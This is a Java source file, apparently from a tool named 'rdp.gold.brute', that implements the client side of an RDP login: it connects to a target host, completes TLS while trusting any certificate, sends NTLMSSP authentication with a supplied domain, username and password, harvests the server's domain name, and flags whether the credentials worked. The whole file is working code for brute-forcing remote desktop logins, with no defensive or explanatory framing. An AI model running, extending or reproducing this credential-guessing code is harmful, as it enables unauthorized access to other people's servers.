package rdp.gold.brute.netty;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.concurrent.atomic.AtomicBoolean;

import javax.net.ssl.SSLSession;

import org.apache.log4j.Logger;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.ssl.SslHandler;
import io.netty.handler.ssl.SslProvider;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;
import io.netty.util.concurrent.Future;
import io.netty.util.concurrent.GenericFutureListener;
import rdp.gold.brute.Config;
import rdp.gold.brute.rdp.ByteBuffer;
import rdp.gold.brute.rdp.Messages.ClientNtlmsspNegotiate;
import rdp.gold.brute.rdp.Messages.ClientNtlmsspPubKeyAuth;
import rdp.gold.brute.rdp.Messages.ClientTpkt;
import rdp.gold.brute.rdp.Messages.ClientX224ConnectionRequestPDU;
import rdp.gold.brute.rdp.Messages.NtlmState;
import rdp.gold.brute.rdp.Messages.ServerNtlmsspChallenge;
import rdp.gold.brute.rdp.Messages.ServerNtlmsspPubKeyPlus1;
import rdp.gold.brute.rdp.Messages.ServerTpkt;
import rdp.gold.brute.rdp.Messages.ServerX224ConnectionConfirmPDU;
import rdp.gold.brute.rdp.ssl.SSLState;

public class ProtocolHandler extends ChannelInboundHandlerAdapter {
    private static final Logger logger = Logger.getLogger(ProtocolHandler.class);

    private static enum READ_LEVEL {
        SERVER_TPKT, SERVER_NTLMSSP_CHALLENGE, SERVER_NTLMSSP_PUB_KEY_PLUS1;

        private READ_LEVEL() {
        }
    }

    private READ_LEVEL read = READ_LEVEL.SERVER_TPKT;
    private SSLState sslState = new SSLState();
    private final NtlmState ntlmState = new NtlmState();
    private String host;
    @SuppressWarnings("unused")
    private int port;
    private String domain;
    private String login;
    private String password;
    private AtomicBoolean isValid;
    private StringBuilder getDomain;

    public ProtocolHandler(String host, int port, String domain, String login, String password, AtomicBoolean isValid, StringBuilder getDomain) {
        this.host = host;
        this.port = port;
        this.domain = domain;
        this.login = login;
        this.password = password;
        this.isValid = isValid;
        this.getDomain = getDomain;
    }

    public void channelRegistered(ChannelHandlerContext ctx) throws Exception {
        super.channelRegistered(ctx);
    }

    public void channelActive(ChannelHandlerContext ctx) {
        ClientTpkt clientTpkt = new ClientTpkt();
        ClientX224ConnectionRequestPDU clientX224ConnectionRequestPDU = new ClientX224ConnectionRequestPDU(this.host, 2);

        ByteBuffer buffer = clientX224ConnectionRequestPDU.proccessPacket(null);
        clientTpkt.proccessPacket(buffer);
        buffer.rewindCursor();

        ctx.writeAndFlush(Unpooled.copiedBuffer(buffer.data, buffer.offset, buffer.length));
    }

    public void channelRead(ChannelHandlerContext ctx, Object msg) {
        ByteBuf byteBuf = (ByteBuf) msg;
        ByteBuffer buffer = new ByteBuffer(-1);

        byte[] bytes = new byte[byteBuf.readableBytes()];
        byteBuf.readBytes(bytes);

        buffer.data = bytes;
        buffer.length = bytes.length;
        buffer.rewindCursor();
        buffer.ref();

        byteBuf.release();
        if (this.read == READ_LEVEL.SERVER_TPKT) {
            readServerTpkt(ctx, buffer);
            this.read = READ_LEVEL.SERVER_NTLMSSP_CHALLENGE;
        } else if (this.read == READ_LEVEL.SERVER_NTLMSSP_CHALLENGE) {
            readServerNtlmSspChallenge(ctx, buffer);
            this.read = READ_LEVEL.SERVER_NTLMSSP_PUB_KEY_PLUS1;
        } else if (this.read == READ_LEVEL.SERVER_NTLMSSP_PUB_KEY_PLUS1) {
            readServerNtlmsspPubKeyPlus1(ctx, buffer);
        }
    }

    @SuppressWarnings({ "unchecked", "rawtypes" })
    private void readServerTpkt(final ChannelHandlerContext ctx, ByteBuffer buffer) {
        ServerTpkt serverTpkt = new ServerTpkt();
        buffer = serverTpkt.proccessPacket(buffer);

        ServerX224ConnectionConfirmPDU serverX224ConnectionConfirmPDU = new ServerX224ConnectionConfirmPDU();
        serverX224ConnectionConfirmPDU.proccessPacket(buffer);

        SslContext sslContext = null;
        try {
            sslContext = SslContextBuilder.forClient().sslProvider(SslProvider.OPENSSL).trustManager(InsecureTrustManagerFactory.INSTANCE).build();

            sslContext.sessionContext().setSessionTimeout(Config.BRUTE_TIMEOUT.intValue());

            SslHandler sslHandler = sslContext.newHandler(ctx.alloc());
            sslHandler.setHandshakeTimeoutMillis(Config.BRUTE_TIMEOUT.intValue());

            ctx.pipeline().addFirst(new ChannelHandler[] { sslHandler });
            ((SslHandler) ctx.pipeline().get(SslHandler.class)).handshakeFuture().addListener(new GenericFutureListener() {
                @Override
                public void operationComplete(Future future) throws Exception {
                    SSLSession sslSession = ((SslHandler) ctx.pipeline().get(SslHandler.class)).engine().getSession();

                    ProtocolHandler.this.sslState.serverCertificateSubjectPublicKeyInfo = sslSession.getPeerCertificateChain()[0].getPublicKey().getEncoded();

                    ClientNtlmsspNegotiate clientNtlmsspNegotiate = new ClientNtlmsspNegotiate(ProtocolHandler.this.ntlmState);
                    ByteBuffer buffer = clientNtlmsspNegotiate.proccessPacket(null);
                    buffer.rewindCursor();

                    ctx.writeAndFlush(Unpooled.copiedBuffer(buffer.data, buffer.offset, buffer.length));
                }

            });
        } catch (Exception e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));

            logger.error(e + " " + sw);
        }
    }

    private void readServerNtlmSspChallenge(ChannelHandlerContext ctx, ByteBuffer buffer) {
        ServerNtlmsspChallenge serverNtlmsspChallenge = new ServerNtlmsspChallenge(this.ntlmState);
        serverNtlmsspChallenge.proccessPacket(buffer);

        this.getDomain.append(this.ntlmState.serverNetbiosDomainName);

        ClientNtlmsspPubKeyAuth clientNtlmsspPubKeyAuth = new ClientNtlmsspPubKeyAuth(this.ntlmState, this.sslState, this.host, this.domain, "workstation", this.login, this.password);

        buffer = clientNtlmsspPubKeyAuth.proccessPacket(null);
        buffer.rewindCursor();

        ctx.writeAndFlush(Unpooled.copiedBuffer(buffer.data, buffer.offset, buffer.length));
    }

    private void readServerNtlmsspPubKeyPlus1(ChannelHandlerContext ctx, ByteBuffer buffer) {
        ServerNtlmsspPubKeyPlus1 serverNtlmsspPubKeyPlus1 = new ServerNtlmsspPubKeyPlus1(this.ntlmState);
        serverNtlmsspPubKeyPlus1.proccessPacket(buffer);

        this.isValid.set(true);

        ctx.channel().disconnect();
    }

    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
        cause.printStackTrace();
        ctx.close();
    }
}
